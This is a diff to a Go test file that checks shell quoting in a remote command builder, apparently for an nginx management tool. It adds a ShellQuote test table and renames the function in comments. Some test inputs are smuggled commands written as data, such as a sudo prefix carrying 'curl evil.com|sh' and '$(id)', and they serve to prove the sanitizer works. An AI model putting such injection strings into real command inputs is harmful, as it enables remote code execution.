@@ -56,7 +56,7 @@ func TestBuildCommand_SudoPrefixInjectionIsQuoted(t *testing.T) {
 	got := buildCommand(cfg, "/usr/sbin/nginx", []string{"-t"})
 	// Each whitespace-separated token must be individually quoted; metacharacters cannot escape.
 	// Tokens: "sudo", "-n;", "curl", "evil.com|sh;", "sudo", "-n"
-	// shellQuote leaves safe tokens bare and single-quotes tokens containing shell metacharacters.
+	// ShellQuote leaves safe tokens bare and single-quotes tokens containing shell metacharacters.
 	want := `sudo '-n;' curl 'evil.com|sh;' sudo -n /usr/sbin/nginx -t`
 	if got != want {
 		t.Errorf("buildCommand(injection) =\n  %q\nwant\n  %q", got, want)
@@ -64,7 +64,7 @@ func TestBuildCommand_SudoPrefixInjectionIsQuoted(t *testing.T) {
 }
 
 // CodeQL flags buildCommand as a command-injection sink because the string
-// reaches a remote shell. shellQuote is the sanitizer, so prove it by running
+// reaches a remote shell. ShellQuote is the sanitizer, so prove it by running
 // the result through a real shell and checking the argument survives intact.
 func TestBuildCommandNeutralisesShellMetacharacters(t *testing.T) {
 	for _, payload := range []string{
@@ -108,5 +108,29 @@ func TestStatCommandUsesPortableTestBinary(t *testing.T) {
 	got := buildCommand(Config{SudoPrefix: "sudo -n"}, name, args)
 	if got != "/bin/test -e /var/run/nginx.pid" {
 		t.Fatalf("buildCommand(stat) = %q, want an unprivileged /bin/test probe", got)
+	}
+}
+
+// ShellQuote is shared with the setup snippets, so its exact output is part
+// of what operators paste into a root shell.
+func TestShellQuote(t *testing.T) {
+	tests := []struct {
+		in, want string
+	}{
+		{"", "''"},
+		{"/usr/sbin/nginx", "/usr/sbin/nginx"},
+		{"nginx.service", "nginx.service"},
+		{"user@host:22", "user@host:22"},
+		{"hello world", "'hello world'"},
+		{"it's", `'it'\''s'`},
+		{"ssh-ed25519 AAAA nginx-ui@generated", "'ssh-ed25519 AAAA nginx-ui@generated'"},
+		{"$(id)", "'$(id)'"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.in, func(t *testing.T) {
+			if got := ShellQuote(tt.in); got != tt.want {
+				t.Errorf("ShellQuote(%q) = %s, want %s", tt.in, got, tt.want)
+			}
+		})
 	}
 }
